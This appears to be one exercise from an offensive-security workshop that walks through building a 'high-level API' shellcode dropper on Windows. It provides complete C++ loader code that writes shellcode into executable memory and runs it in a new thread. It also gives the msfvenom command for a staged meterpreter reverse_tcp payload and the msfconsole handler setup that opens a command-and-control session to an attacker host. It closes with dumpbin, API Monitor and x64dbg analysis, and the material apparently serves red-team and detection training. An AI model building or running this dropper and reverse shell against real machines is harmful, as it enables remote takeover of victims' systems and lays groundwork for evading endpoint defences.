## Exercise 3: High_Level_API_Dropper
And we need to make sure that the shellcode thread completes its execution before the main thread exits.In this exercise, we want to take the first step toward creating our own direct system call dropper. But to understand the principle of a legitimate syscall itself, we will start by creating a **high-level API shellcode dropper**, or **HLA-Dropper** for short, based on the **Windows APIs** loaded by **kernel32.dll**, which will serve as our reference dropper for later modifications. This means that in the first step I deliberately do not use native APIs or direct system calls yet, but start with the classic implementation via Windows APIs, which are obtained via the kernel32.dll.
![_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235367776-54229a66-f1d6-4b8e-a2a2-7bb81fecbf48.png)


## Exercise 3 tasks:
### Create HLA-Dropper
1. Create a new C++ POC in Visual Studio 2019 and use the provided code for the HLA-Dropper.
2. Create staged x64 meterpreter shellcode with msfvenom and copy it to the C++ HLA-Dropper POC. 
3. Compile the HLA-Dropper as release or debug x64. 
4. Create and run a staged x64 meterpreter listener with msfconsole.
5. Run your compiled .exe and verify that a stable command and control channel opens. 
### Analyse HLA-Dropper
6. Use the Visual Studio tool dumpbin to analyze the compiled HLA-Dropper. Is the result what you expected?  
7. Use the API Monitor to analyze the compiled HLA-Dropper in the context of the four APIs used. Is the result what you expected? 
8. Use the x64dbg debugger to analyze the compiled HLA dropper: from which module and location are the syscalls from the four APIs used being executed?
Is the result what you expected?


## Visual Studio 
The POC can be created as a new C++ project (Console Application) in Visual Studio by following the steps below. 
<details>
<p align="center">
<img width="652" alt="image" src="https://user-images.githubusercontent.com/50073731/235356344-c14f9123-751c-462c-a610-50c7156f93f9.png">
</p>

The easiest way is to create a new console app project and then replace the default hello world text in main.cpp with your code. 

<p align="center">
<img width="640" alt="image" src="https://user-images.githubusercontent.com/50073731/235357092-5fd2e873-6732-4b37-a69d-38a281953b2e.png">
<img width="645" alt="image" src="https://user-images.githubusercontent.com/50073731/235357228-940ec56c-7565-44b8-8b6a-01a74ab15e1d.png">
</p>
</details>


The technical functionality of the HLA-Dropper is relatively simple and therefore, in my opinion, perfectly suited to gradually develop the HLA-Dropper into a low-level dropper using direct system calls. In the HLA-Dropper we use the following Windows APIs: 
- VirtualAlloc
- WriteProcessMemory
- CreateThread
- WaitForSingleObject

The code works like this. First, we need to define the thread function for shellcode execution later in the code.
```
// Define the thread function for executing shellcode
// This function will be executed in a separate thread created later in the main function
DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
    void (*shellcode)() = (void (*)())lpParam;

    // Call the shellcode function using the function pointer
    shellcode();

    // Return 0 as the thread exit code
    return 0;
}
```
  
  
Within the main function, the variable **code** is defined, which is responsible for storing the meterpreter shellcode. The content of "code" is stored in the .text (code) section of the PE structure or, if the shellcode is larger than 255 bytes, the shellcode is stored in the .rdata section.
```
// Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83";
```

    
The next code block defines the function pointer **void***, which points to the variable **exec** and stores the return address of the allocated memory using the Windows API VirtualAlloc.
```
// Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```
    

The meterpreter shellcode is then copied to the allocated memory using the Windows API **WriteProcessMemory**.
<details>
```
// Copy the shellcode into the allocated memory region using WriteProcessMemory
    SIZE_T bytesWritten;
    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
```
</details>
    

Next, the Windows API **CreateThread** is used to execute the meterpreter shellcode. This is done by creating a new thread.<p align="center">
<details>
```
// Create a new thread to execute the shellcode
    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
    // The returned handle of the created thread is stored in hThread
    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL); 
```
</details>

And by using the Windows API **WaitForSingleObject** we need to make sure that the shellcode thread completes its execution before the main thread exits.
<details>    
```
// Wait for the shellcode execution thread to finish executing
    // This ensures the main thread doesn't exit before the shellcode has finished running
    WaitForSingleObject(hThread, INFINITE);    
```
</details>    

Here is the **complete code**, and you can copy and paste this code into your **HLA-Dropper** project in Visual Studio.
You can also download the complete **HLA-Dropper Visual Studio projec**t in the **Code Example section** of this repository.
<details>
```
#include <stdio.h>
#include <windows.h>

// Define the thread function for executing shellcode
// This function will be executed in a separate thread created later in the main function
DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
    void (*shellcode)() = (void (*)())lpParam;

    // Call the shellcode function using the function pointer
    shellcode();

    // Return 0 as the thread exit code
    return 0;
}

int main() {
    // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83...";

    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region using WriteProcessMemory
    SIZE_T bytesWritten;
    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Create a new thread to execute the shellcode
    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
    // The returned handle of the created thread is stored in hThread
    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL);

    // Wait for the shellcode execution thread to finish executing
    // This ensures the main thread doesn't exit before the shellcode has finished running
    WaitForSingleObject(hThread, INFINITE);

    // Return 0 as the main function exit code
    return 0;
}
```
</details>

## Meterpreter Shellcode
In this step, we will create our meterpreter shellcode for the HLA dropper poc with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
</p>

The shellcode can then be copied into the HLA dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.
<p align="center">
<img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
</p>


## MSF-Listener
Before we test the functionality of our HLA-Dropper, we need to create a listener within msfconsole.

**kali>**
```
msfconsole
```
**msf>**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IPv4_Redirector_or_IPv4_Kali
set lport 80 
set exitonsession false
run
```
<p align="center">
<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
</p>

Once the listener has been successfully started, you can run your compiled high_level_dropper.exe. If all goes well, you should see an incoming command and control session 

<p align="center">
<img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
</p>



## HLA-Dropper analysis: dumpbin tool
The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports.
**cmd>**
```
cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
dumpbin /imports high_level.exe
```
In the case of the HLA-Dropper, you should see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are correctly imported into the HLA-Dropper from the kernel32.dll.
<p align="center">
<img width="693" alt="image" src="https://user-images.githubusercontent.com/50073731/235369396-dbad1178-e9a2-4c55-8c6a-fdc9362d864c.png">
</p>

## HLA-Dropper analysis: API-Monitor
We use API Monitor to check the transition from the four used Windows APIs to the four corresponding native APIs.
For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and corresponding native APIs, which can prove the transition from Windows APIs (kernel32.dll) to native APIs (ntdll.dll), in the context of the HLA-Dropper, we filter on the following API calls:
- VirtualAlloc
- NtAllocateVirtualMemory
- WriteProcessMemory
- NtWriteVirtualMemory
- CreateThread
- NtCreateThreadEx
- WaitForSingleObject
- NtWaitForSingleObject

If everything was done correctly, you should see clean transitions from the Windows APIs used to the native APIs we used in our HLA-Dropper POC.
<p align="center">
<img width="498" alt="image" src="https://user-images.githubusercontent.com/50073731/235368737-9f87f5de-0a7e-4039-b454-2af23914b277.png">
</p>

## HLA-Dropper analysis: x64dbg 
Using x64dbg I check from which region of the PE structure of the HLA-Dropper the system call for the native API NtAllocateVirtualMemory is executed. As direct system calls are not yet used in this dropper, the figure shows that the system call is correctly executed from the .text region of ntdll.dll. This investigation is very important because later in the article we expect a different result with the low level dropper and want to match it.
![image](https://user-images.githubusercontent.com/50073731/235368598-ad159117-abb5-4b0d-8b52-bea2a162b565.png)


## Summary: High-level API Dropper
- No direct system calls at all
- Syscall execution over normal transition from high_level_dropper.exe -> kernel32.dll -> ntdll.dll -> syscall
- Dropper imports VirtualAlloc from kernel32.dll...
- ...then imports NtAllocateVirtualMemory from ntdll.dll...
- ...and finally executes the corresponding syscall or syscall stub
